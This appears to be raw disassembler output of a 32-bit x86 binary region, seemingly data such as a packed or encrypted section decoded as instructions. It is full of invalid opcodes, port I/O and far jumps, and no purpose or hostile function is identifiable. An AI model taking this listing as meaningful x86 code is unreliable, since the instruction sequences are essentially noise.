  4247b0:	push   ds
  4247b1:	push   ecx
  4247b2:	sub    BYTE PTR [edi],dl
  4247b4:	xchg   edx,eax
  4247b5:	mov    edi,0x428e30e8
  4247ba:	retf   0x4c5a
  4247bd:	add    DWORD PTR [ecx+0x50dc7471],ebx
  4247c3:	jne    0x42483c
  4247c5:	cdq    
  4247c6:	jnp    0x424788
  4247c8:	jnp    0x424837
  4247ca:	mov    esp,0xe9a38146
  4247cf:	cs and eax,0x89040919
  4247d5:	xor    cl,BYTE PTR [edi-0x40]
  4247d8:	inc    ebx
  4247d9:	aad    0xf7
  4247db:	mov    edi,0xce5f1137
  4247e0:	imul   ebx,DWORD PTR [eax-0x2c],0xffffff8c
  4247e4:	repz (bad) 
  4247e6:	outs   dx,DWORD PTR ds:[esi]
  4247e7:	fcom   DWORD PTR ds:0xfefa03af
  4247ed:	xchg   BYTE PTR [esi-0x64bc0c1d],al
  4247f3:	push   0x38861cf7
  4247f8:	or     al,0x42
  4247fa:	jne    0x4247b1
  4247fc:	xchg   ebp,eax
  4247fd:	mov    ch,0xa5
  4247ff:	in     eax,dx
  424800:	js     0x42485e
  424802:	adc    ecx,DWORD PTR [esi-0x3c]
  424805:	(bad)
  424809:	push   es
  42480a:	pop    ebx
  42480b:	cwde   
  42480c:	aam    0x9c
  42480e:	xchg   BYTE PTR [esi-0xa0f2d3],al
  424814:	in     eax,dx
  424815:	ss jl  0x4247de
  424818:	inc    esi
  424819:	ins    DWORD PTR es:[edi],dx
  42481a:	arpl   WORD PTR [ebp+0x6b],bx
  42481d:	nop
  42481e:	sub    al,0x50
  424820:	jb     0x4247e8
  424822:	(bad)  
  424823:	xor    BYTE PTR [esi],al
  424825:	inc    edx
  424826:	icebp  
  424827:	aas    
  424828:	pop    ss
  424829:	sub    al,0xb4
  42482b:	lods   al,BYTE PTR ds:[esi]
  42482c:	loope  0x424854
  42482e:	ret    0x5666
  424831:	xchg   edx,eax
  424832:	les    ebp,FWORD PTR [ecx+0x1c]
  424835:	fdivrp st(5),st
  424837:	nop
  424838:	or     eax,0x19932056
  42483d:	jns    0x424861
  42483f:	sahf   
  424840:	clc    
	...
  4248b1:	add    BYTE PTR [eax],al
  4248b3:	add    BYTE PTR [edx-0x770e5c],cl
  4248b9:	(bad)  
  4248bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248bc:	arpl   WORD PTR [ecx+0x31],dx
  4248bf:	je     0x4248a0
  4248c1:	and    BYTE PTR [ecx],al
  4248c3:	push   ss
  4248c4:	pop    edi
  4248c5:	test   DWORD PTR [ecx],eax
  4248c7:	add    ch,dh
  4248c9:	add    BYTE PTR [eax],al
  4248cb:	add    bh,cl
  4248cd:	pop    edx
  4248ce:	rcl    BYTE PTR [ebx-0xd],cl
  4248d1:	cdq    
  4248d2:	push   ebx
  4248d3:	das    
  4248d4:	std    
  4248d5:	xor    DWORD PTR [edx+0x0],esp
  4248d8:	push   0xffffffb1
  4248da:	popa   
  4248db:	inc    eax
  4248dc:	jmp    0x424871
  4248de:	and    eax,esi
  4248e0:	outs   dx,BYTE PTR ds:[esi]
  4248e1:	jle    0x4248b5
  4248e3:	or     BYTE PTR ds:0x7288f610,al
  4248e9:	outs   dx,BYTE PTR ds:[esi]
  4248ea:	jno    0x4248f8
  4248ec:	daa    
  4248ed:	sahf   
  4248ee:	xor    DWORD PTR [edi],0xbd183ddc
  4248f4:	add    eax,0x9c103497
  4248f9:	(bad)  
  4248fa:	sbb    BYTE PTR [eax],ch
  4248fc:	sub    al,0x3a
  4248fe:	jo     0x4248aa
  424900:	push   ds
  424901:	cdq    
  424902:	or     dh,al
  424904:	inc    edi
  424905:	shl    BYTE PTR [eax+ebp*1+0x2122b084],0xb7
  42490d:	mov    esi,0x4d1bf92
  424912:	mov    dh,0x6
  424914:	push   cs
  424915:	mov    eax,0x8244554b
  42491a:	test   BYTE PTR [edi+0x34677cee],0xe
  424921:	or     BYTE PTR [eax+0x15],0x92
  424925:	inc    ecx
  424926:	imul   eax,DWORD PTR [ebp+0x55d9b925],0xffffffc2
  42492d:	in     eax,0x74
  42492f:	cmp    esi,DWORD PTR [eax+0x686a66df]
  424935:	fcom   QWORD PTR [ebx]
  424937:	mov    ebx,0x4ded81ab
  42493c:	and    ebx,DWORD PTR [edi]
  42493e:	dec    ecx
  42493f:	cmp    eax,0x6916e744
  424944:	pop    edx
  424945:	mov    bh,0xc8
  424947:	add    ecx,DWORD PTR [eax+0x78]
  42494a:	xchg   DWORD PTR [edx+0x7],ecx
  42494d:	fs adc al,0xa
  424950:	icebp  
  424951:	mov    eax,ds:0x3c72071f
  424956:	dec    edi
  424957:	adc    eax,0xddd28bf1
  42495c:	bnd ret 
  42495e:	sub    BYTE PTR [ecx-0x61],ch
  424961:	enter  0xdc4c,0x8c
  424965:	or     bl,BYTE PTR [edi+0x676c1ca7]
  42496b:	push   ebx
  42496c:	and    ebx,DWORD PTR [eax-0x6f38a4e4]
  424972:	sar    edx,1
  424974:	cs mov dl,0xf
  424977:	das    
  424978:	(bad)  [edi]
  42497a:	mov    ah,0xd5
  42497c:	inc    eax
  42497d:	add    al,0xc9
  42497f:	push   0x275bd1bf
  424984:	es mov ecx,0x4e55f876
  42498a:	mov    esi,DWORD PTR [esi+0x47142c30]
  424990:	clc    
  424991:	jmp    0x424a05
  424993:	ror    ebp,0x4a
  424996:	in     al,dx
  424997:	dec    edi
  424998:	dec    esp
  424999:	cmp    DWORD PTR ds:0x38e1ebd,0x1b
  4249a0:	mov    dh,0x55
  4249a2:	in     eax,dx
  4249a3:	sub    DWORD PTR [edx-0xb5ca0d0],eax
  4249a9:	(bad)  
  4249ac:	les    esp,FWORD PTR ds:0xe4e9747e
  4249b2:	not    DWORD PTR [esi]
  4249b4:	cmp    ecx,DWORD PTR cs:[edi]
  4249b7:	(bad)  
  4249b8:	and    eax,esi
  4249ba:	mov    esi,0x8f05f43e
  4249bf:	sbb    cl,bl
	...
  424a31:	add    BYTE PTR [eax],al
  424a33:	add    BYTE PTR [eax],dh
  424a35:	cmp    eax,0xdf7d9f75
  424a3a:	cli    
  424a3b:	mov    edi,0x13301881
  424a40:	jge    0x424a05
  424a42:	adc    eax,0x186548e
  424a47:	add    ch,dh
  424a49:	add    BYTE PTR [eax],al
  424a4b:	add    BYTE PTR [ebp-0x46827157],cl
  424a51:	fnstcw WORD PTR [esp+eax*2-0x7b881a48]
  424a58:	ds loope 0x424ad6
  424a5b:	jl     0x4249e1
  424a5d:	xor    DWORD PTR [ebp+0x53b04056],ecx
  424a63:	mov    edx,0x914dec68
  424a68:	mov    eax,ds:0x3df159e3
  424a6d:	pop    esi
  424a6e:	xchg   esi,eax
  424a6f:	sub    al,BYTE PTR [esi-0xd]
  424a72:	(bad)  
  424a73:	not    BYTE PTR [ebp+0x1c76daeb]
  424a79:	adc    edi,DWORD PTR [si-0xc2c]
  424a7e:	sti    
  424a7f:	into   
  424a80:	push   0x12
  424a82:	or     eax,0x68603ada
  424a87:	(bad)  
  424a88:	loopne 0x424ae1
  424a8a:	mov    dl,BYTE PTR [edx-0x1e46c634]
  424a90:	inc    edi
  424a91:	fcmovnu st,st(3)
  424a93:	(bad)  
  424a94:	jecxz  0x424b08
  424a96:	xchg   ecx,eax
  424a97:	pop    es
  424a98:	stc    
  424a99:	cdq    
  424a9a:	popf   
  424a9b:	add    al,ch
  424a9d:	pop    ebp
  424a9e:	mov    ebx,0x62b386f4
  424aa3:	dec    ebp
  424aa4:	dec    ebp
  424aa5:	or     al,0x3f
  424aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424aa8:	in     eax,dx
  424aa9:	pop    ds
  424aaa:	jp     0x424aea
  424aac:	cmovns ebx,ebx
  424aaf:	leave  
  424ab0:	jmp    0x424a5b
  424ab2:	jo     0x424add
  424ab4:	iret   
  424ab5:	cmp    DWORD PTR [edi],edx
  424ab7:	push   ss
  424ab8:	cli    
  424ab9:	add    dh,BYTE PTR [ebp+eax*2-0x38c95370]
  424ac0:	push   ds
  424ac1:	in     al,dx
  424ac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ac3:	sub    eax,0xce814f4c
  424ac8:	pushf  
  424ac9:	(bad)  
  424aca:	cmp    DWORD PTR [ecx+0x4bde4691],ecx
  424ad0:	xchg   BYTE PTR [eax+0x28f9e30e],bl
  424ad6:	sbb    BYTE PTR [ebx],ah
  424ad8:	fld    TBYTE PTR cs:[ebp+0x4524bd88]
  424adf:	cmp    bl,al
  424ae1:	dec    esp
  424ae2:	pop    ebx
  424ae3:	out    0x79,eax
  424ae5:	mov    edx,DWORD PTR [ebp-0x4c4ecde]
  424aeb:	push   esi
  424aec:	push   0xfeac77e7
  424af1:	inc    edx
  424af2:	jne    0x424b61
  424af4:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  424af6:	xlat   BYTE PTR ds:[ebx]
  424af7:	inc    edi
  424af8:	ret    
  424af9:	inc    eax
  424afa:	hlt    
  424afb:	adc    DWORD PTR [ecx+0x4e3dc750],ebx
  424b01:	sbb    BYTE PTR cs:[ebx],al
  424b04:	adc    ah,BYTE PTR [esi]
  424b06:	pusha  
  424b07:	xchg   esp,eax
  424b08:	bound  ecx,QWORD PTR [edi]
  424b0a:	loop   0x424af3
  424b0c:	push   0xfffffff4
  424b0e:	call   0xbc7c:0xfee1e96d
  424b15:	bound  edx,QWORD PTR [eax]
  424b17:	data16 aam 0xa2
  424b1a:	inc    esi
  424b1b:	jne    0x424b45
  424b1d:	aaa    
  424b1e:	loop   0x424b8c
  424b20:	jmp    0xec574666
  424b25:	in     eax,0x4b
  424b27:	and    al,0xcc
  424b29:	daa    
  424b2a:	or     ch,BYTE PTR [edi+0x5d]
  424b2d:	ret    0xa389
  424b30:	push   esp
  424b31:	jno    0x424b18
  424b33:	mov    cl,0xe
  424b35:	jmp    0x424b02
  424b37:	into   
  424b38:	call   0x2dd7:0x22e68eea
  424b3f:	and    ah,al
	...
  424bb1:	add    BYTE PTR [eax],al
  424bb3:	add    ch,bh
  424bb5:	(bad)  
  424bb6:	test   eax,0xff57ab46
  424bbb:	jmp    FWORD PTR [edx-0x14b9f881]
  424bc1:	mov    cs,WORD PTR [esi+0x1874937]
  424bc7:	add    ch,dh
  424bc9:	add    BYTE PTR [eax],al
  424bcb:	add    BYTE PTR [ecx],cl
  424bcd:	out    dx,eax
  424bce:	sahf   
  424bcf:	fstp   TBYTE PTR [eax+eax*2-0x347230f3]
  424bd6:	test   DWORD PTR [ecx+0x14],0xe84b9874
  424bdd:	fcmovnu st,st(7)
  424bdf:	jg     0x424bbc
  424be1:	add    dl,bl
  424be3:	sbb    eax,0x7557d1fd
  424be8:	mov    al,0x87
  424bea:	inc    edi
  424beb:	cmp    dl,dh
  424bed:	es sbb eax,0x8cf6b858
  424bf3:	ss ss mov ebx,0xeb2c25e9
  424bfa:	inc    esi
  424bfb:	ja     0x424bbd
  424bfd:	mov    ebp,0x23a7f852
  424c02:	and    al,0x73
  424c04:	mov    ds:0xe17946e8,al
  424c09:	call   0xeaa7:0x4814721a
  424c10:	arpl   WORD PTR [esi],bp
  424c12:	xchg   ebp,eax
  424c13:	adc    cl,BYTE PTR ds:0x13a6ac78
  424c19:	push   esi
  424c1a:	hlt    
  424c1b:	xchg   ebx,eax
  424c1c:	sahf   
  424c1d:	sub    ch,BYTE PTR [ebp+ebp*2-0x9]
  424c21:	inc    ecx
  424c22:	vcmpps ymm6,ymm5,YMMWORD PTR [esi+0x7a],0xfd
  424c28:	push   ds
  424c29:	outs   dx,DWORD PTR ds:[esi]
  424c2a:	xor    eax,0xe682d44f
  424c2f:	add    eax,0x992c2eaf
  424c34:	loopne 0x424c27
  424c36:	out    0xc0,eax
  424c38:	push   cs
  424c39:	jp     0x424c97
  424c3b:	call   0x165b5544
  424c40:	pop    edx
  424c41:	in     eax,0x66
  424c43:	push   ss
  424c44:	dec    DWORD PTR [edx]
  424c46:	dec    ebp
  424c47:	sub    edx,DWORD PTR [ebx-0xb]
  424c4a:	cmp    ah,BYTE PTR [ebx+0x31]
  424c4d:	retf   0xd82e
  424c50:	and    dh,BYTE PTR [ebx-0x22]
  424c53:	cmp    BYTE PTR [ebp+0x3bdaad9a],0x35
  424c5a:	mov    eax,0xd924b821
  424c5f:	pop    edi
  424c60:	push   es
  424c61:	es or  ebx,ecx
  424c64:	bound  esp,QWORD PTR [esi-0x65]
  424c67:	outs   dx,DWORD PTR ds:[esi]
  424c68:	adc    al,0xe2
  424c6a:	(bad)  
  424c6b:	(bad)  
  424c6c:	loope  0x424c6a
  424c6e:	jb     0x424c26
  424c70:	sbb    esi,DWORD PTR [ebp-0x2135024e]
  424c76:	ins    BYTE PTR es:[edi],dx
  424c77:	push   esi
  424c78:	push   esi
  424c79:	ins    DWORD PTR es:[edi],dx
  424c7a:	push   esp
  424c7b:	in     al,dx
  424c7c:	pop    ds
  424c7d:	test   DWORD PTR [ecx+0x23],0xeda0fc25
  424c84:	(bad)  
  424c85:	(bad)  
  424c86:	stos   BYTE PTR es:[edi],al
  424c87:	aaa    
  424c88:	repz adc al,0x32
  424c8b:	mov    bl,0x9e
  424c8d:	int    0xe9
  424c8f:	std    
  424c90:	sub    ch,BYTE PTR [ebp-0x36]
  424c93:	hlt    
  424c94:	sbb    eax,0x88c73e60
  424c99:	iret   
  424c9a:	sar    DWORD PTR ds:0x2f2cdaf2,1
  424ca0:	mov    cl,0x42
  424ca2:	cmp    al,0xe8
  424ca4:	cli    
  424ca5:	out    0x5e,eax
  424ca7:	xchg   esi,eax
  424ca8:	into   
  424ca9:	out    dx,eax
  424caa:	push   ds
  424cab:	ins    BYTE PTR es:[edi],dx
  424cac:	xchg   ecx,eax
  424cad:	sbb    al,0x24
  424caf:	xchg   BYTE PTR [ebx],dh
  424cb1:	mov    DWORD PTR [edi],0xbf8d7e65
  424cb7:	jl     0x424d07
  424cb9:	in     eax,0x65
  424cbb:	dec    eax
  424cbc:	xor    BYTE PTR [esi],bh
  424cbe:	push   ds
  424cbf:	inc    edx
  424cc0:	jne    0x424cc2
	...
  424d32:	add    BYTE PTR [eax],al
  424d34:	(bad)  
  424d35:	test   BYTE PTR [edi-0x118668f7],0xff
  424d3c:	test   BYTE PTR [ecx-0x24d16b29],cl
  424d42:	push   eax
  424d43:	iret   
  424d44:	mov    BYTE PTR ds:[ecx],al
  424d47:	add    ch,dh
  424d49:	add    BYTE PTR [eax],al
  424d4b:	add    BYTE PTR [edx+edi*4],ah
  424d4e:	push   es
  424d4f:	jno    0x424dbd
  424d51:	enter  0x3a6d,0xfc
  424d55:	arpl   WORD PTR [edx+0x1d],cx
  424d58:	int3   
  424d59:	jecxz  0x424da9
  424d5b:	mov    esp,0x44b9102
  424d60:	mov    esi,0x6c7b72b
  424d65:	pushf  
  424d66:	cmp    ah,ch
  424d68:	sbb    dl,bh
  424d6a:	xor    BYTE PTR [ecx-0x930d59b],al
  424d70:	mov    ch,bl
  424d72:	push   0x5199c545
  424d77:	inc    ebp
  424d78:	js     0x424d12
  424d7a:	test   BYTE PTR [eax+0x48],dl
  424d7d:	adc    al,0xf6
  424d7f:	popf   
  424d80:	jo     0x424d3d
  424d82:	mov    ch,0xa4
  424d84:	add    eax,eax
  424d86:	mov    bh,0x70
  424d88:	pop    eax
  424d89:	repnz mov WORD PTR [ebx-0x77],cs
  424d8d:	mov    ebp,0x1475f472
  424d92:	add    esp,eax
  424d94:	mov    bh,0xa8
  424d96:	and    al,0x29
  424d98:	inc    eax
  424d99:	lea    ebp,[ebp+0x40818668]
  424d9f:	mov    dh,0x8c
  424da1:	and    cl,ch
  424da3:	(bad)  
  424da4:	jecxz  0x424dd4
  424da6:	mov    cl,0x2c
  424da8:	(bad)  
  424da9:	jmp    0x424df1
  424dab:	cmp    esi,DWORD PTR [ebx]
  424dad:	clc    
  424dae:	inc    edi
  424daf:	data16 jmp 0x424d74
  424db2:	les    eax,FWORD PTR [ebx+0x3f]
  424db5:	push   ebx
  424db6:	and    ebp,ebp
  424db8:	mov    ebx,0x29a2492b
  424dbd:	arpl   WORD PTR [esi],cx
  424dbf:	lods   al,BYTE PTR ds:[esi]
  424dc0:	add    eax,0xe1974072
  424dc5:	mov    dl,BYTE PTR [ebp-0x4303a068]
  424dcb:	cmp    eax,0xf4d675cc
  424dd0:	xchg   ebp,eax
  424dd1:	loop   0x424d53
  424dd3:	adc    BYTE PTR [ecx],ah
  424dd5:	jecxz  0x424dc0
  424dd7:	(bad)  
  424dd8:	mov    dh,BYTE PTR [edx-0x3d668d40]
  424dde:	loopne 0x424d79
  424de0:	push   ss
  424de1:	into   
  424de2:	add    bh,BYTE PTR [edi]
  424de4:	push   ds
  424de5:	mov    ecx,0x5753299e
  424dea:	xlat   BYTE PTR ds:[ebx]
  424deb:	mov    edi,0x58a997da
  424df0:	pop    ebp
  424df1:	retf   
  424df2:	scas   al,BYTE PTR es:[edi]
  424df3:	test   eax,0xbd7b1f62
  424df8:	and    edi,ecx
  424dfa:	push   DWORD PTR [ecx-0x43679686]
  424e00:	pop    ss
  424e01:	jns    0x424d8a
  424e03:	push   ebp
  424e04:	mov    ds:0x7a6e594d,eax
  424e09:	xchg   BYTE PTR [edi],ch
  424e0b:	test   al,0x5e
  424e0d:	aad    0x62
  424e0f:	(bad)  
  424e10:	data16 ins BYTE PTR es:[edi],dx
  424e12:	xor    eax,esi
  424e14:	inc    edx
  424e15:	pop    es
  424e16:	push   cs
  424e17:	ds daa 
  424e19:	(bad)  
  424e1a:	mov    ebx,0x177fb379
  424e1f:	add    eax,0xba1e4b15
  424e24:	out    0xaa,eax
  424e26:	mov    dl,0x3e
  424e28:	shr    BYTE PTR [eax-0xc9c4369],1
  424e2e:	xor    DWORD PTR [ebx+0x6f99f79],edx
  424e34:	and    eax,0x2ddd594b
  424e39:	hlt    
  424e3a:	bnd jb 0x424ea6
  424e3d:	mov    ch,0xe9
  424e3f:	cmp    al,0xbb
	...
  424eb1:	add    BYTE PTR [eax],al
  424eb3:	add    BYTE PTR [esi+0x74b9649a],ch
  424eb9:	(bad)  
  424eba:	call   FWORD PTR [edi-0x6d72b26e]
  424ec0:	scas   eax,DWORD PTR es:[edi]
  424ec1:	mov    al,0x2f
  424ec3:	jns    0x424ef8
  424ec5:	mov    DWORD PTR [ecx],eax
  424ec7:	add    ch,dh
  424ec9:	add    BYTE PTR [eax],al
  424ecb:	add    BYTE PTR [ebp-0x10],cl
  424ece:	push   edi
  424ecf:	sub    DWORD PTR [eax-0x51c4cf5b],0xffffffaf
  424ed6:	mov    edi,?
  424ed8:	jle    0x424f27
  424eda:	inc    eax
  424edb:	(bad)  
  424edc:	xor    ecx,esi
  424ede:	xor    eax,0xc10e9ad6
  424ee3:	imul   ebp,DWORD PTR [ecx+0x7],0xba8e9d62
  424eea:	iret   
  424eeb:	(bad)  
  424eec:	fcom   st(6)
  424eee:	retf   
  424eef:	cdq    
  424ef0:	add    bh,0xd5
  424ef3:	inc    esp
  424ef4:	sub    ebp,esi
  424ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ef7:	sar    DWORD PTR [ecx-0x7466640d],0xe6
  424efe:	stc    
  424eff:	jmp    0x598b:0x31e5f5cd
  424f06:	outs   dx,BYTE PTR ds:[esi]
  424f07:	idiv   DWORD PTR [eax+0x68f18e0a]
  424f0d:	xchg   ecx,eax
  424f0e:	push   esi
  424f0f:	xchg   edi,eax
  424f10:	pusha  
  424f11:	jns    0x424f4c
  424f13:	xor    DWORD PTR [edi-0x653d7643],edi
  424f19:	or     eax,0xcf7f5e8
  424f1e:	inc    ebx
  424f1f:	leave  
  424f20:	cmp    BYTE PTR [eax+esi*1+0x55],al
  424f24:	ret    
  424f25:	dec    ebx
  424f26:	dec    edx
  424f27:	fdivr  DWORD PTR [edi-0x742e6f09]
  424f2d:	aam    0x7a
  424f2f:	pop    esp
  424f30:	push   ebp
  424f31:	lock cdq 
  424f33:	cmp    edi,DWORD PTR [eax+0x31531140]
  424f39:	retf   
  424f3a:	dec    ebp
  424f3b:	int3   
  424f3c:	scas   al,BYTE PTR es:[edi]
  424f3d:	pusha  
  424f3e:	mov    cl,0x1b
  424f40:	aaa    
  424f41:	jmp    0xa709d841
  424f46:	ffreep st(5)
  424f48:	mov    ds:0x6496ab84,eax
  424f4d:	mov    eax,0x9a49db6a
  424f52:	mov    ch,bl
  424f54:	dec    edi
  424f55:	outs   dx,DWORD PTR ds:[esi]
  424f56:	adc    eax,edx
  424f58:	in     eax,0xa
  424f5a:	and    ecx,DWORD PTR ds:0xe0effc78
  424f60:	int    0xc5
  424f62:	dec    eax
  424f63:	pop    esi
  424f64:	xchg   DWORD PTR [edi],eax
  424f66:	out    0xe0,al
  424f68:	repnz pop esp
  424f6a:	xor    BYTE PTR ss:[esi-0x6e479689],al
  424f71:	xor    al,0xa0
  424f73:	and    DWORD PTR [esi],0x93c5b28d
  424f79:	test   DWORD PTR [ecx],ebp
  424f7b:	push   esi
  424f7c:	(bad)  
  424f7d:	sbb    edx,DWORD PTR [ecx-0x7d]
  424f80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f81:	push   0x9abe060e
  424f86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f87:	xchg   edi,eax
  424f88:	pop    eax
  424f89:	popa   
  424f8a:	or     dh,BYTE PTR [ecx-0x24]
  424f8d:	(bad)  
  424f8e:	pop    edi
  424f8f:	scas   al,BYTE PTR es:[edi]
  424f90:	loopne 0x424f46
  424f92:	mov    dh,0x74
  424f94:	loope  0x424f9f
  424f96:	rol    BYTE PTR [eax-0x7],cl
  424f99:	cmp    edi,esp
  424f9b:	pop    ecx
  424f9c:	dec    ebx
  424f9d:	add    esi,ebp
  424f9f:	icebp  
  424fa0:	xor    eax,0x8e829de5
  424fa5:	(bad)  
  424fa6:	outs   dx,BYTE PTR ds:[esi]
  424fa7:	pop    ecx
  424fa8:	push   esp
  424fa9:	jle    0x424f53
  424fab:	jo     0x424fa9
  424fad:	(bad)  
  424fae:	sub    eax,0xaff15ae7
  424fb3:	jp     0x424fa9
  424fb5:	ret    
  424fb6:	dec    eax
  424fb7:	push   esi
  424fb8:	(bad)  
  424fb9:	jae    0x424f69
  424fbb:	aad    0x6f
  424fbd:	sub    bh,BYTE PTR [eax+0xa]
  424fc0:	add    eax,0x0
	...
  425031:	add    BYTE PTR [eax],al
  425033:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  425037:	mov    cl,0x2e
  425039:	idiv   edi
  42503b:	fst    st(3)
  42503d:	inc    eax
  42503e:	sahf   
  42503f:	pop    ds
  425040:	out    0x6f,eax
  425042:	cmp    DWORD PTR [eax],0x18a28
  425048:	cmc    
  425049:	add    BYTE PTR [eax],al
  42504b:	add    BYTE PTR [ecx-0x3e],dl
  42504e:	push   ecx
  42504f:	lods   al,BYTE PTR ds:[esi]
  425050:	repnz dec edx
  425052:	sub    al,0x48
  425054:	push   esp
  425055:	mov    eax,esp
  425057:	push   cs
  425058:	retf   
  425059:	in     al,0xe3
  42505b:	mov    edi,ecx
  42505d:	mov    bl,0x8a
  42505f:	add    dh,ah
  425061:	cdq    
  425062:	std    
  425063:	or     edi,DWORD PTR [edx]
  425065:	arpl   WORD PTR [ebx-0x77],bp
  425068:	or     dh,bh
  42506a:	dec    edi
  42506b:	jmp    0x42501b
  42506d:	stos   DWORD PTR es:[edi],eax
  42506e:	inc    esi
  42506f:	repnz stc 
  425071:	addr16 hlt 
  425073:	jmp    0x425021
  425075:	xchg   edi,eax
  425076:	stos   BYTE PTR es:[edi],al
  425077:	and    DWORD PTR [ebx-0x48644195],0xffffff8d
  42507e:	inc    ecx
  42507f:	loopne 0x4250f1
  425081:	ins    BYTE PTR es:[edi],dx
  425082:	in     al,0x22
  425084:	clc    
  425085:	test   al,0xf0
  425087:	cs push ds
  425089:	adc    BYTE PTR [ebp+0x3fe6d8fd],0x18
  425090:	dec    ecx
  425091:	loopne 0x42509d
  425093:	jae    0x42510a
  425095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425096:	mov    edx,0x6b702faf
  42509b:	cdq    
  42509c:	test   BYTE PTR [ecx+0x51],dh
  42509f:	jp     0x425097
  4250a1:	pop    ecx
  4250a2:	push   es
  4250a3:	popa   
  4250a4:	adc    al,0x4c
  4250a6:	push   edx
  4250a7:	and    DWORD PTR [ebp-0x72],0xe77a04e6
  4250ae:	inc    eax
  4250af:	adc    ebx,DWORD PTR [edi+eax*2-0x2742f57d]
  4250b6:	xor    ebx,DWORD PTR [ecx+0x4a]
  4250b9:	inc    ebx
  4250ba:	icebp  
  4250bb:	inc    esp
  4250bc:	or     edx,DWORD PTR [edi+0x31]
  4250bf:	mov    WORD PTR [edx],?
  4250c1:	pop    edi
  4250c2:	sahf   
  4250c3:	je     0x4250fe
  4250c5:	mov    dl,ch
  4250c7:	push   ds
  4250c8:	push   0x5d
  4250ca:	push   ds
  4250cb:	add    WORD PTR gs:[eax+0x45c4c8be],0x3aa1
  4250d5:	pop    ebx
  4250d6:	clc    
  4250d7:	rol    BYTE PTR [edx-0x55655cd4],cl
  4250dd:	fxch   st(6)
  4250df:	xor    cl,BYTE PTR [ecx+0x3e706a56]
  4250e5:	out    dx,al
  4250e6:	lds    edx,FWORD PTR [ebp-0x6d3f89c2]
  4250ec:	popf   
  4250ed:	fbld   TBYTE PTR ds:0x159b90c1
  4250f4:	ret    0x7b33
  4250f7:	dec    ebx
  4250f8:	xchg   edx,eax
  4250f9:	push   es
  4250fa:	aaa    
  4250fb:	aaa    
  4250fc:	pusha  
  4250fd:	xor    dh,BYTE PTR [ecx-0x67]
  425100:	inc    eax
  425101:	stos   DWORD PTR es:[edi],eax
  425102:	inc    ebx
  425103:	push   cs
  425104:	aad    0xb9
  425106:	mov    cs:0xc3e828a5,al
  42510c:	sbb    DWORD PTR ds:0x61a857d4,ebx
  425112:	jo     0x425168
  425114:	retf   
  425115:	mov    edx,0x20e2e4ca
  42511a:	sub    BYTE PTR [ecx],0xa3
  42511d:	sub    al,0xd6
  42511f:	sub    eax,0x6dd98f03
  425124:	adc    ch,al
  425126:	(bad)  
  425128:	mov    WORD PTR [edi+0x3a],es
  42512b:	or     al,0xd2
  42512d:	adc    bh,BYTE PTR [esi+0x41]
  425130:	dec    eax
  425132:	jp     0x42518d
  425134:	or     ah,ch
  425136:	shl    edi,0x90
  425139:	cmp    DWORD PTR [edx+0x13],eax
  42513c:	jmp    0x0:0xb88a4b30
	...
  4251b3:	add    BYTE PTR [edi-0x4c275c4c],al
  4251b9:	(bad)  
  4251bb:	call   DWORD PTR [esi+0x14]
  4251be:	and    esp,esi
  4251c0:	inc    ecx
  4251c1:	or     BYTE PTR [ecx+0x18b1dc6],bl
  4251c7:	add    ch,dh
  4251c9:	add    BYTE PTR [eax],al
  4251cb:	add    BYTE PTR [edx],bh
  4251cd:	adc    DWORD PTR [edi+0x4dc41256],esi
  4251d3:	fidiv  WORD PTR [esp+eax*1+0x4a]
  4251d7:	add    eax,0x3200204c
  4251dc:	jbe    0x425258
  4251de:	lahf   
  4251df:	fs (bad) 
  4251e1:	out    0xf0,ax
  4251e4:	adc    eax,0xdc78d2a3
  4251e9:	enter  0x9245,0xe5
  4251ed:	into   
  4251ee:	fnsave [eax+0x77]
  4251f1:	push   ecx
  4251f2:	and    eax,0x16f711bd
  4251f7:	jg     0x4251fc
  4251f9:	sbb    BYTE PTR [esi-0x109ca2db],cl
  4251ff:	sub    BYTE PTR [edx+0x62],ah
  425202:	xchg   DWORD PTR [ebx],ecx
  425204:	iret   
  425205:	push   edi
  425206:	sub    BYTE PTR [esp+eiz*2-0x14],ah
  42520a:	int3   
  42520b:	out    dx,eax
  42520c:	jne    0x425263
  42520e:	add    BYTE PTR [ecx],cl
  425210:	mov    al,ds:0x146dcd71
  425215:	test   eax,0xae4901be
  42521a:	sub    ch,BYTE PTR ds:0x4f187ae
  425220:	enter  0xe322,0x96
  425224:	fstp   QWORD PTR [edi-0x1e]
  425227:	out    0x31,eax
  425229:	lds    edi,FWORD PTR [ecx]
  42522b:	test   al,0xd0
  42522d:	sub    dl,ch
  42522f:	pop    es
  425230:	rcl    BYTE PTR [ecx],cl
  425232:	pusha  
  425233:	pop    edi
  425234:	aaa    
  425235:	pop    ss
  425236:	nop
  425237:	sbb    eax,0x5446c803
  42523c:	and    eax,0xb5eb9f47
  425241:	sbb    esp,DWORD PTR [ecx-0x15f9a3ff]
  425247:	adc    al,BYTE PTR [ecx+ebx*8]
  42524a:	stos   BYTE PTR es:[edi],al
  42524b:	call   0xa799:0x97ea1350
  425252:	hlt    
  425253:	loope  0x425259
  425255:	sub    eax,0xabb127b7
  42525a:	cdq    
  42525b:	inc    BYTE PTR [eax]
  42525d:	stos   BYTE PTR es:[edi],al
  42525e:	(bad)  
  425260:	and    bh,ah
  425262:	cdq    
  425263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425264:	xchg   edi,eax
  425265:	(bad)  
  425267:	xor    eax,0x15df84e1
  42526c:	ja     0x425230
  42526e:	jbe    0x42521d
  425270:	jl     0x425287
  425272:	xor    BYTE PTR [ebp+0x5c],cl
  425275:	sbb    BYTE PTR [ebx],dl
  425277:	(bad)  
  425278:	push   esi
  425279:	ret    
  42527a:	sti    
  42527b:	jae    0x4252c5
  42527d:	loopne 0x4252a8
  42527f:	sub    eax,0x97b4916a
  425284:	fdivr  DWORD PTR [edx+0x43cb535c]
  42528a:	adc    eax,0x88445867
  42528f:	lahf   
  425290:	jecxz  0x425246
  425292:	dec    ebp
  425293:	pop    ecx
  425294:	shr    esp,0x6b
  425297:	fistp  DWORD PTR [edx-0x35]
